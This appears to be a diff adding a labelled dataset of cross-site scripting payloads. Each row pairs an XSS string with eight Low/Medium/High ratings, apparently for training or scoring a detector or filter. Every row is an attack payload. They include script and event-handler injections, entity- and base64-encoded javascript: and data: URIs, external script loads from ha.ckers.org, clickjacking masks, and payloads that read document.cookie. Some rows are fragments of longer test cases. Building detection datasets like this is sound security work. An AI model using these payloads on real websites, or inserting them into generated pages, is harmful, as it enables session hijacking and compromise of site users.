+<img src ?itworksonchrome?\/onerror = alert(1)???	L	L	M	L	M	L	M	M	
+<svg><script>//&newline;confirm(1);</script </svg>	M	L	M	L	M	L	L	M	
+<svg><script onlypossibleinopera:-)> alert(1)	M	L	L	L	M	L	L	M	
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3a;&#97lert(1)>clickme	M	L	L	L	M	H	M	M	
+<script x> alert(1) </script 1=2	M	L	L	L	M	M	M	M	
+<div/onmouseover='alert(1)'> style="x:">	H	L	M	L	M	L	L	M	
+<--`<img/src=` onerror=alert(1)> --!>	M	L	M	L	M	L	L	M	
+<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ?	L	L	L	L	H	M	L	H	
+<div  style="position:absolute;top:0;left:0;width:100%;height:100%"  onmouseover="prompt(1)" onclick="alert(1)">x</button>?	L	L	M	L	M	M	M	H	
+"><img src=x onerror=window.open('https://www.google.com/');>	H	L	M	L	M	L	L	M	
+<form><button formaction=javascript&colon;alert(1)>clickme	M	L	M	L	M	L	L	M	
+<math><a xlink:href="//jsfiddle.net/t846h/">click	M	L	M	L	M	L	L	M	
+<object data=data:text/html;base64,phn2zy9vbmxvywq9ywxlcnqomik+></object>?	M	L	M	L	M	L	L	M	
+<iframe  src="data:text/html,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e"></iframe>	L	L	M	L	M	L	L	M	
+<a  href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">click  me</a>	L	L	M	L	L	L	M	L	
+"><img src=x onerror=prompt(1);>	M	L	M	L	M	L	L	M	
+<script>alert('xss');</script>	M	L	L	L	M	L	L	M	
+'';!--"<xss>=&{()}	M	L	L	L	M	L	L	L	
+<script src=http://ha.ckers.org/xss.js></script>	M	L	M	L	M	L	L	M	
+<img src="javascript:alert('xss');">	M	L	M	L	M	L	L	M	
+<img src=javascript:alert('xss')>	M	L	M	L	M	L	L	M	
+<img src=javascript:alert('xss')>	M	L	M	L	M	L	L	M	
+<img src=javascript:alert(&quot;xss&quot;)>	M	L	M	L	M	L	L	M	
+<img src=`javascript:alert("rsnake says, 'xss'")`>	M	L	L	L	M	L	M	M	
+<img src=javascript:alert(string.fromcharcode(88,83,83))>	M	L	M	L	M	L	L	M	
+src=&#10<img 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>	L	L	L	L	L	L	L	H	
+<img src=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>	L	L	L	L	H	L	L	L	
+<img src=&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3a&#x61&#x6c&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>	L	L	L	L	H	L	L	H	
+<img src="jav	ascript:alert('xss');">	M	L	L	L	M	L	L	M	
+<img src="jav&#x09;ascript:alert('xss');">	H	L	L	L	M	L	L	M	
+<img src="jav&#x0a;ascript:alert('xss');">	H	L	L	L	M	L	L	M	
+<img src="jav&#x0d;ascript:alert('xss');">	H	L	L	L	M	L	L	M	
+<img src=" &#14;  javascript:alert('xss');">	H	L	M	L	M	L	M	M	
+<script/xss src="http://ha.ckers.org/xss.js"></script>	M	L	M	L	M	L	L	M	
+<script src=http://ha.ckers.org/xss.js?<b>	M	L	M	L	M	L	L	M	
+<img src="javascript:alert('xss')"	M	L	M	L	M	L	L	M	
+<script>a=/xss/	M	L	L	L	L	L	L	L	
+\";alert('xss');//	M	L	L	L	M	L	L	L	
+<input type="image" src="javascript:alert('xss');">	H	L	M	L	M	L	L	M	
+<body background="javascript:alert('xss')">	M	L	L	L	M	L	L	M	
+<body onload=alert('xss')>	M	L	L	L	M	L	L	M	
+<img dynsrc="javascript:alert('xss')">	M	L	L	L	M	L	L	M	
+<img lowsrc="javascript:alert('xss')">	M	L	L	L	M	L	L	M	
+<bgsound src="javascript:alert('xss');">	M	L	L	L	M	L	L	M	
+<br size="&{alert('xss')}">	M	L	L	L	M	L	L	M	
+<layer src="http://ha.ckers.org/scriptlet.html"></layer>	M	L	L	L	M	L	L	M	
+<link rel="stylesheet" href="javascript:alert('xss');">	H	L	M	L	M	L	L	M	
+<link rel="stylesheet" href="http://ha.ckers.org/xss.css">	H	L	M	L	M	L	L	M	
+<style>@import'http://ha.ckers.org/xss.css';</style>	M	L	L	L	M	L	L	M	
+<meta http-equiv="link" content="<http://ha.ckers.org/xss.css>; rel=stylesheet">	L	L	M	L	M	L	M	M	
+<style>body{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</style>	M	L	M	L	M	L	L	M	
+<img src='vbscript:msgbox("xss")'>	M	L	L	L	M	L	L	M	
+<img src="mocha:[code]">	M	L	L	L	M	L	L	M	
+<img src="livescript:[code]">	M	L	L	L	M	L	L	M	
+<meta http-equiv="refresh" content="0;url=javascript:alert('xss');">	L	L	M	L	M	L	L	M	
+<meta http-equiv="refresh" content="0;url=data:text/html;base64,phnjcmlwdd5hbgvydcgnwfntjyk8l3njcmlwdd4k">	H	L	M	L	M	L	L	M	
+<meta http-equiv="link" content="<javascript:alert('xss')>; rel=stylesheet">	L	L	M	L	M	L	M	M	
+<meta http-equiv="refresh" content="0; url=http://;url=javascript:alert('xss');">	L	L	M	L	M	L	M	M	
+<iframe src="javascript:alert('xss');"></iframe>	H	L	M	L	M	L	L	M	
+<frameset><frame src="javascript:alert('xss');"></frameset>	L	L	M	L	M	L	L	M	
+<table background="javascript:alert('xss')">	M	L	L	L	M	L	L	M	
+<div style="background-image: url(javascript:alert('xss'))">	M	L	M	L	M	L	L	M	
+<div style="background-image: url(&#1;javascript:alert('xss'))">	H	L	M	L	M	L	L	M	
+<div style="width: expression(alert('xss'));">	M	L	M	L	M	L	L	M	
+<style>@im\port'\ja\vasc\ript:alert("xss")';</style>	H	L	L	L	M	L	L	M	
+<img style="xss:expr/*xss*/ession(alert('xss'))">	M	L	L	L	M	L	L	M	
+<xss style="xss:expression(alert('xss'))">	M	L	L	L	M	L	L	M	
+exp/*<xss style='no\xss:noxss("*//*");	M	L	L	L	M	L	L	M	
+<style type="text/javascript">alert('xss');</style>	H	L	M	L	M	L	L	M	
+<style>.xss{background-image:url("javascript:alert('xss')");}</style><a class=xss></a>	L	L	M	L	M	L	L	M	
+<style type="text/css">body{background:url("javascript:alert('xss')")}</style>	L	L	M	L	M	L	L	M	
+<base href="javascript:alert('xss');//">	M	L	M	L	M	L	L	M	
+<object type="text/x-scriptlet" data="http://ha.ckers.org/scriptlet.html"></object>	H	L	M	L	M	L	L	M	
+<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('xss')></object>	L	L	M	L	M	M	M	M	
+geturl("javascript:alert('xss')")	M	L	L	L	M	L	L	M	
+a="get";	M	L	L	L	L	L	L	L	
+<!--<value><![cdata[<xml id=i><x><c><![cdata[<img src="javas<![cdata[cript:alert('xss');">	L	L	M	L	M	L	L	M	
+<xml src="http://ha.ckers.org/xsstest.xml" id=i></xml>	H	L	M	L	M	L	L	M	
+<html><body>	M	L	L	L	L	L	L	L	
+<script src="http://ha.ckers.org/xss.jpg"></script>	M	L	M	L	M	L	L	M	
+<!--#exec cmd="/bin/echo '<script src'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></script>'"-->	L	M	M	L	H	L	M	M	
+<? echo('<scr)';	M	L	L	L	M	L	L	L	
+<meta http-equiv="set-cookie" content="userid=&lt;script&gt;alert('xss')&lt;/script&gt;">	L	L	M	L	M	L	L	M	
+<head><meta http-equiv="content-type" content="text/html; charset=utf-7"> </head>+adw-script+ad4-alert('xss');+adw-/script+ad4-	L	L	M	L	M	M	M	H	
+<script a=">" src="http://ha.ckers.org/xss.js"></script>	L	L	M	L	M	L	L	M	
+<script a=">" '' src="http://ha.ckers.org/xss.js"></script>	L	L	M	L	M	L	M	M	
+<script "a='>'" src="http://ha.ckers.org/xss.js"></script>	L	L	M	L	M	L	L	M	
+<script a=`>` src="http://ha.ckers.org/xss.js"></script>	H	L	M	L	M	L	L	M	
+<script>document.write("<scri");</script>pt src="http://ha.ckers.org/xss.js"></script>	L	L	M	L	M	L	L	M	
+<div id="28">1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=alert(28)&gt;>//["'`-->]]>]</div>	L	L	M	L	H	M	M	H	
+<div id="39"><!-- up to opera 11.52, ff 3.6.28 -->	M	L	L	L	M	M	M	M	
+<![><img src="]><img src=x onerror=alert(39)//">	L	L	M	L	M	L	M	M	
+<svg><![cdata[><image xlink:href="]]><img src=xx:x onerror=alert(2)//"></svg>//["'`-->]]>]</div>	L	L	M	L	H	L	M	M	
+<div id="40"><style><img src="</style><img src=x onerror=alert(40)//">//["'`-->]]>]</div>	L	L	M	L	M	M	M	M	
+<div id="41"><li style=list-style:url() onerror=alert(41)></li>	L	L	M	L	M	M	M	M	
+<div style=content:url(data:image/svg+xml,%3csvg/%3e);visibility:hidden onload=alert(41)></div>//["'`-->]]>]</div>	L	L	M	L	H	M	L	M	
+<div id="42"><head><base href="javascript://"/></head><body><a href="/. /,alert(42)//#">xxx</a></body>//["'`-->]]>]</div>	L	L	M	L	H	M	M	H	
+<div id="43"><?xml version="1.0" standalone="no"?>	L	L	L	L	M	M	M	M	
+<html xmlns="http://www.w3.org/1999/xhtml">	M	L	L	L	M	L	L	M	
+<style type="text/css">	M	L	L	L	L	L	L	M	
+@font-face {font-family: y; src: url("font.svg#x") format("svg");} body {font: 100px "y";}	M	L	M	L	M	L	M	M	
+<body>hello</body>	M	L	L	L	L	L	L	L	
+</html>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
+<div id="53"><xml id="xss" src="test.htc"></xml>	L	L	M	L	L	L	M	M	
+<label dataformatas="html" datasrc="#xss" datafld="payload"></label>//["'`-->]]>]</div>	L	L	M	L	M	L	M	M	
+<div id="61"><div  style="\63&#9\06f&#10\0006c&#12\00006f&#13\r:\000072 ed;color\0\bla:yellow\0\bla;col\0\00 \&#xa0or:blue;">xxx</div>//["'`-->]]>]</div>	L	L	M	L	H	L	M	H	
+<div id="62"><!-- ie 6-8 -->	M	L	L	L	M	M	M	M	
+<x '="foo"><x foo='><img src=x onerror=alert(62)//'>	L	L	M	L	M	L	M	M	
+<! '="foo"><x foo='><img src=x onerror=alert(2)//'>	L	L	M	L	M	L	M	M	
+<? '="foo"><x foo='><img src=x onerror=alert(3)//'>//["'`-->]]>]</div>	L	L	M	L	M	L	M	M	
+<div id="63"><embed src="javascript:alert(63)"></embed> // o10.10↓, om10.0↓, gc6↓, ff	L	L	M	L	M	M	M	M	
+<img src="javascript:alert(2)">	M	L	M	L	M	L	L	M	
+<image src="javascript:alert(2)"> // ie6, o10.10↓, om10.0↓	M	L	L	L	M	L	M	M	
+<script src="javascript:alert(3)"></script> // ie6, o11.01↓, om10.1↓//["'`-->]]>]</div>	L	L	M	L	M	L	M	M	
+<div id="64"><!doctype x[<!entity x system "http://html5sec.org/test.xxe">]><y>&x;</y>//["'`-->]]>]</div><div id="65"><svg onload="javascript:alert(65)" xmlns="http://www.w3.org/2000/svg"></svg>//["'`-->]]>]</div>	L	L	M	L	L	M	M	L	
+<div id="66"><?xml version="1.0"?>	H	L	L	L	M	M	L	M	
+<?xml-stylesheet type="text/xsl" href="data:,%3cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/xsl/transform' id='xss'%3e%3cxsl:output method='html'/%3e%3cxsl:template match='/'%3e%3cscript%3ealert(66)%3c/script%3e%3c/xsl:template%3e%3c/xsl:transform%3e"?>	L	L	M	L	H	H	M	L	
+<root/>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
+<div id="67"><!doctype x [	M	L	L	L	L	L	M	M	
+    <!attlist img xmlns cdata "http://www.w3.org/1999/xhtml" src cdata "xx:x"	M	L	M	L	M	L	M	M	
+ onerror cdata "alert(67)"	L	L	L	L	L	L	M	M	
+ onload cdata "alert(2)">	M	L	L	L	L	L	M	M	
+]><img />//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
+<div id="68"><doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml">	L	L	M	L	M	M	M	M	
+    <html:style /><x xlink:href="javascript:alert(68)" xlink:type="simple">xxx</x>	L	L	M	L	M	L	M	M	
+</doc>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
+<div id="83"><x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(83)"><x:timer value="1"/></x:template>//["'`-->]]>]</div>	L	L	M	L	L	M	M	L	
+<div id="84"><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="javascript:alert(84)//#x"/>//["'`-->]]>]</div><div id="85"><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="test.evt#x"/>//["'`-->]]>]</div><div id="86"><body oninput=alert(86)><input autofocus>//["'`-->]]>]</div>	L	L	H	L	L	H	M	L	
+<div id="87"><svg xmlns="http://www.w3.org/2000/svg">	H	L	M	L	M	M	L	M	
+<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(87)"><rect width="1000" height="1000" fill="white"/></a>	L	L	M	L	M	M	M	H	
+</svg>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
+<div id="88"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">	L	L	M	L	M	M	M	M	
+<animation xlink:href="javascript:alert(88)"/>	M	L	M	L	M	L	L	M	
+<animation xlink:href="data:text/xml,%3csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3e%3c/svg%3e"/>	L	L	M	L	M	M	M	M	
+<image xlink:href="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3e%3c/svg%3e"/>	L	L	M	L	M	M	M	M	
+<foreignobject xlink:href="javascript:alert(88)"/>	M	L	M	L	M	L	L	M	
+<foreignobject xlink:href="data:text/xml,%3cscript xmlns='http://www.w3.org/1999/xhtml'%3ealert(88)%3c/script%3e"/>	L	L	M	L	M	M	L	M	
+</svg>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
+<div id="89"><svg xmlns="http://www.w3.org/2000/svg">	H	L	M	L	M	M	L	M	
+<set attributename="onmouseover" to="alert(89)"/>	H	L	L	L	M	L	L	M	
+<animate attributename="onunload" to="alert(89)"/>	H	L	L	L	M	L	L	M	
+</svg>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
+<div id="90"><!-- up to opera 10.63 -->	M	L	L	L	M	M	M	M	
+<div style=content:url(test2.svg)></div>	M	L	M	L	M	L	L	M	
+<div style="background:url(test5.svg)">press enter</div>//["'`-->]]>]</div>	L	L	M	L	M	L	L	M	
+<div id="91">[a]	M	L	L	L	L	L	L	L	
+<? foo="><script>alert(91)</script>">	H	L	L	L	M	L	L	M	
+<! foo="><script>alert(91)</script>">	H	L	L	L	M	L	L	M	
+</ foo="><script>alert(91)</script>">	H	L	L	L	M	L	L	M	
+<? foo="><x foo='?><script>alert(91)</script>'>">	L	L	L	L	M	L	L	M	
+<! foo="[[[x]]"><x foo="]foo><script>alert(91)</script>">	L	L	L	L	M	L	L	M	
+<% foo><x foo="%><script>alert(91)</script>">//["'`-->]]>]</div>	L	L	M	L	M	L	L	M	
+<div id="92"><div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">x</div>//["'`-->]]>]</div><div id="93"><div style="list-style:url(http://foo.f)\20url(javascript:alert(93));">x</div>//["'`-->]]>]</div>	L	L	H	L	L	M	M	L	
+<div id="94"><svg xmlns="http://www.w3.org/2000/svg">	H	L	M	L	M	M	L	M	
+<handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(94)</handler>	H	L	M	L	M	M	L	M	
+</svg>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
+<div id="95"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">	L	L	M	L	M	M	M	M	
+<set attributename="xlink:href" to="data:image/svg+xml;charset=utf-8;base64,	M	L	M	L	M	L	L	M	
+phn2zyb4bwxucz0iahr0cdovl3d3dy53my5vcmcvmjawmc9zdmcipjxzy3jpchq%2bywxlcnqomsk8l3njcmlwdd48l3n2zz4ncg%3d%3d"/>	M	L	L	L	L	M	L	M	
+</svg>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
+<div id="96"><iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe>	H	L	M	L	M	L	L	M	
+<iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>//["'`-->]]>]</div>	L	L	M	L	M	L	L	M	
+<div id="97"><!-- ie 5-9 -->	M	L	L	L	M	M	M	M	
+<div id=d><x xmlns="><iframe onload=alert(97)"></div>	L	L	M	L	M	M	M	M	
+<script>d.innerhtml+='';</script>	M	L	L	L	M	L	L	M	
+<div id=d><x xmlns='"><iframe onload=alert(2)//'></div>	L	L	M	L	M	M	M	M	
+<script>d.innerhtml+='';</script>//["'`-->]]>]</div>	L	L	M	L	M	L	L	M	
+<div id="98"><div id=d><div style="font-family:'sans\27\2f\2a\22\2a\2f\3b color\3ared\3b'">x</div></div>	L	L	M	L	M	H	M	M	
+<script>with(document.getelementbyid("d"))innerhtml=innerhtml</script>//["'`-->]]>]</div>	L	L	M	L	M	L	L	M	
+<div id="99">xxx<style>	M	L	L	L	L	L	L	M	
+</style>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
+<div id="104"><svg xmlns="http://www.w3.org/2000/svg" id="foo">	L	L	M	L	M	M	M	M	
+<x xmlns="http://www.w3.org/2001/xml-events" event="load" observer="foo" handler="data:image/svg+xml,%3csvg%20xmlns%3d%22http%3a%2f%2fwww.w3.org%2f2000%2fsvg%22%3e%0a%3chandler%20xml%3aid%3d%22bar%22%20type%3d%22application%2fecmascript%22%3e alert(104) %3c%2fhandler%3e%0a%3c%2fsvg%3e%0a#bar"/>	L	L	M	L	M	L	M	L	
+</svg>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
+<div id="105"><iframe src="data:image/svg-xml,%1f%8b%08%00%00%00%00%00%02%03%b3)n.%ca%2c(q%a8%c8%cd%c9%2b%b6u%ca())%b0%d2%d7%2f%2f%2f%d7%2b7%d6%cb%2fj%d77%b4%b4%b4%d4%af%c8(%c9%cdq%b2k%cci-*%d10%d4%b4%d1%87%e8%b2%03"></iframe>//["'`-->]]>]</div><div id="106"><img src onerror /" '"= alt=alert(106)//">//["'`-->]]>]</div><div id="107"><title onpropertychange=alert(107)></title><title title=></title>//["'`-->]]>]</div>	L	L	H	L	L	L	M	L	
+<div id="108"><!-- ie 5-8 standards mode -->	M	L	L	L	M	M	M	M	
+<a href=http://foo.bar/#x=`y></a><img alt="`><img src=xx:x onerror=alert(108)></a>">	L	L	M	L	M	L	M	M	
+<!a foo=x=`y><img alt="`><img src=xx:x onerror=alert(2)//">	L	L	M	L	M	L	M	M	
+<?a foo=x=`y><img alt="`><img src=xx:x onerror=alert(3)//">//["'`-->]]>]</div>	L	L	M	L	M	L	M	M	
+<div id="109"><svg xmlns="http://www.w3.org/2000/svg">	H	L	M	L	M	M	L	M	
+<a id="x"><rect fill="white" width="1000" height="1000"/></a>	L	L	M	L	L	M	M	M	
+<rect  fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/>	L	L	M	L	H	M	M	H	
+</svg>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
+<div id="110"><svg xmlns="http://www.w3.org/2000/svg">	H	L	M	L	M	M	L	M	
+<path d="m0,0" style="marker-start:url(test4.svg#a)"/>	H	L	M	L	M	L	L	M	
+</svg>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
+<div id="111"><div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">x</div>//["'`-->]]>]</div><div id="112"><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">x</div>//["'`-->]]>]</div>	L	L	M	L	L	M	M	L	
+<div id="113"><div id="x">xxx</div>	L	L	M	L	L	L	L	M	
+</style>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
+<div id="114"><x style="background:url('x[a];color:red;/*')">xxx</x>//["'`-->]]>]</div>	L	L	M	L	H	L	L	M	
+<div id="115"><!--[if]><script>alert(115)</script -->	L	L	M	L	M	M	L	M	
+<!--[if<img src=x onerror=alert(2)//]> -->//["'`-->]]>]</div>	L	L	M	L	M	L	M	M	
+<div id="116"><div id="x">x</div>	L	L	M	L	L	L	L	M	
+<xml:namespace prefix="t">	M	L	L	L	L	L	L	M	
+<import namespace="t" implementation="#default#time2">	H	L	L	L	L	L	L	M	
+<t:set attributename="innerhtml" targetelement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=alert(116)&gt;">//["'`-->]]>]</div>	L	L	M	L	H	M	M	H	
+<div id="117"><a href="http://attacker.org">	H	L	M	L	M	L	L	M	
+    <iframe src="http://example.org/"></iframe>	M	L	M	L	M	L	M	M	
+</a>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
+<div id="118"><div draggable="true" ondragstart="event.datatransfer.setdata('text/plain','malicious code');">	L	L	M	L	M	L	M	M	
+    <h1>drop me</h1>	M	L	L	L	L	L	M	L	
+<iframe src="http://www.example.org/drophere.html"></iframe>//["'`-->]]>]</div>	L	L	M	L	M	L	L	M	
+<div id="119"><iframe src="view-source:http://www.example.org/" frameborder="0" style="width:400px;height:180px"></iframe>	L	L	M	L	M	M	M	H	
+<textarea type="text" cols="50" rows="10"></textarea>//["'`-->]]>]</div>	L	L	M	L	M	M	M	M	
+<div id="120"><script>	M	L	L	L	L	L	L	M	
+    for (i=1;i<6;i++) {	L	L	M	L	M	M	M	M	
+        window.open('popup.html','spam'+i,'width=50,height=50');	H	L	M	L	M	M	M	M	
+<a href="#" onclick="makepopups()">spam</a>//["'`-->]]>]</div>	L	L	M	L	M	L	L	M	
+<div id="121"><html xmlns="http://www.w3.org/1999/xhtml"	H	L	M	L	M	M	L	M	
+xmlns:svg="http://www.w3.org/2000/svg">	M	L	M	L	M	L	L	M	
+<body style="background:gray">	M	L	L	L	L	L	L	M	
+<iframe src="http://example.com/" style="width:800px; height:350px; border:none; mask: url(#maskforclickjacking);"/>	H	L	M	L	M	L	M	M	
+<svg:svg>	L	L	L	L	L	L	L	L	
+<svg:mask id="maskforclickjacking" maskunits="objectboundingbox" maskcontentunits="objectboundingbox">	L	L	L	L	L	L	M	M	
+    <svg:rect x="0.0" y="0.0" width="0.373" height="0.3" fill="white"/>	L	L	L	L	M	M	M	M	
+    <svg:circle cx="0.45" cy="0.7" r="0.075" fill="white"/>	L	L	L	L	M	M	M	M	
+</svg:svg>	L	L	L	L	L	L	L	L	
+</html>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
+<div id="122"><iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"></iframe>//["'`-->]]>]</div>	L	L	M	L	M	L	M	H	
+<div id="123"><span class=foo>some text</span>	H	L	M	L	L	L	M	M	
+<a class=bar href="http://www.example.org">www.example.org</a>	H	L	M	L	M	L	L	M	
+<script src="http://code.jquery.com/jquery-1.4.4.js"></script>	M	L	M	L	M	M	L	M	
+$("span.foo").click(function() {	M	L	L	L	M	L	L	M	
+$("a.bar").click();	M	L	L	L	M	L	L	L	
+$("a.bar").click(function() {	M	L	L	L	M	L	L	M	
+location="http://html5sec.org";	M	L	L	L	M	L	L	M	
+</script>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
+<div id="124"><script src="/\example.com\foo.js"></script> // safari 5.0, chrome 9, 10	L	L	M	L	M	M	M	M	
+<script src="\\example.com\foo.js"></script> // safari 5.0//["'`-->]]>]</div>	L	L	M	L	M	M	M	M	
+<div id="125"><?xml version="1.0"?>	H	L	L	L	M	M	L	M	
+<?xml-stylesheet type="text/xml" href="#stylesheet"?>	H	L	L	L	M	L	L	M	
+  id    id    #required>]>	M	L	L	L	L	L	M	M	
+<svg xmlns="http://www.w3.org/2000/svg">	M	L	M	L	M	L	L	M	
+    <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/xsl/transform">	L	L	L	L	M	M	M	M	
+        <xsl:template match="/">	M	L	L	L	L	L	M	M	
+            <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(125)"></iframe>	H	L	M	L	M	M	M	M	
+    <circle fill="red" r="40"></circle>	H	L	L	L	L	L	M	M	
+</svg>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
+<div id="126"><object id="x" classid="clsid:cb927d12-4ff7-4a9e-a169-56e4b8a75598"></object>	L	L	M	L	M	M	M	M	
+<object classid="clsid:02bf25d5-8c17-4b23-bc80-d3488abddc6b" onqt_error="alert(126)" style="behavior:url(#x);"><param name=postdomevents /></object>//["'`-->]]>]</div>	L	L	M	L	H	M	M	H	
+<div id="127"><svg xmlns="http://www.w3.org/2000/svg" id="x">	L	L	M	L	M	M	M	M	
+<listener event="load" handler="#y" xmlns="http://www.w3.org/2001/xml-events" observer="x"/>	L	L	L	L	M	M	M	M	
+<handler id="y">alert(127)</handler>	M	L	L	L	M	L	L	M	
+</svg>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
+<div id="128"><svg><style>&lt;img/src=x onerror=alert(128)// </b>//["'`-->]]>]</div>	L	L	M	L	M	M	M	M	
+<div id="129"><svg>	M	L	L	L	L	L	L	L	
+<image style='filter:url("data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.alert(129)</script></svg>")'>	L	L	M	L	M	M	L	H	
+<image filter='...'>	M	L	L	L	M	L	L	L	
+</svg>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
+<div id="130"><math href="javascript:alert(130)">clickme</math>	L	L	M	L	M	M	L	M	
+<maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(2)">clickme</maction>	L	L	M	L	M	L	L	M	
+<maction actiontype="statusline" xlink:href="javascript:alert(3)">clickme<mtext>http://http://google.com</mtext></maction>	L	L	M	L	M	L	L	H	
+</math>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
+<div id="131"><b>drag and drop one of the following strings to the drop box:</b>	H	M	M	L	L	L	M	M	
+<br/><hr/>	M	L	L	L	L	L	L	L	
+javascript:alert('top page location: '+document.location+' host page cookies: '+document.cookie);//	M	L	M	L	M	L	M	M	
+<br/><hr/>	M	L	L	L	L	L	L	L	
+feed:javascript:alert('top page location: '+document.location+' host page cookies: '+document.cookie);//	M	L	M	L	M	M	M	M	
+<br/><hr/>	M	L	L	L	L	L	L	L	
+feed:data:text/html,&#x3c;script>alert('top page location: '+document.location+' host page cookies: '+document.cookie)&#x3c;/script>&#x3c;b>	H	L	M	L	H	M	M	H	
+<br/><hr/>	M	L	L	L	L	L	L	L	
+feed:feed:javascript:javascript:feed:alert('top page location: '+document.location+' host page cookies: '+document.cookie);//	M	L	M	L	M	M	M	H	
+<br/><hr/>	M	L	L	L	L	L	L	L	
+<div id="dropbox" style="height: 360px;width: 500px;border: 5px solid #000;position: relative;" ondragover="event.preventdefault()">+ drop box +</div>//["'`-->]]>]</div>	L	L	M	L	H	L	M	H	
+<div id="132"><!doctype html>	M	L	M	L	L	L	L	M	
+<label>type a,b,c,d - watch the network tab/traffic (js is off, latest noscript)</label>	M	L	M	L	M	M	M	M	
+<input name="secret" type="password">	H	L	L	L	L	L	L	M	
+<!-- injection --><svg height="50px">	M	L	L	L	M	L	M	M	
+<image xmlns:xlink="http://www.w3.org/1999/xlink">	M	L	M	L	M	L	L	M	
+<set attributename="xlink:href" begin="accesskey(a)" to="//example.com/?a" />	L	L	M	L	M	L	M	M	
+<set attributename="xlink:href" begin="accesskey(b)" to="//example.com/?b" />	L	L	M	L	M	L	M	M	
+<set attributename="xlink:href" begin="accesskey(c)" to="//example.com/?c" />	L	L	L	L	M	M	M	M	
+<set attributename="xlink:href" begin="accesskey(d)" to="//example.com/?d" />	L	L	L	L	M	M	M	M	
+</svg>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
+<div id="133"><!-- `<img/src=xx:xx onerror=alert(133)//--!>//["'`-->]]>]</div>	L	L	M	L	H	M	M	M	
+<div id="134"><xmp>	M	L	L	L	L	L	L	L	
+<img alt='%></xmp><img src=xx:x onerror=alert(134)//'>	L	L	M	L	M	L	M	M	
+x='<%'	M	L	L	L	L	L	L	L	
+</script> %>/	M	L	L	L	L	L	L	L	
+*{color:red}</style>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
+<div id="135"><?xml-stylesheet type="text/xsl" href="#" ?>	L	L	M	L	M	L	M	M	
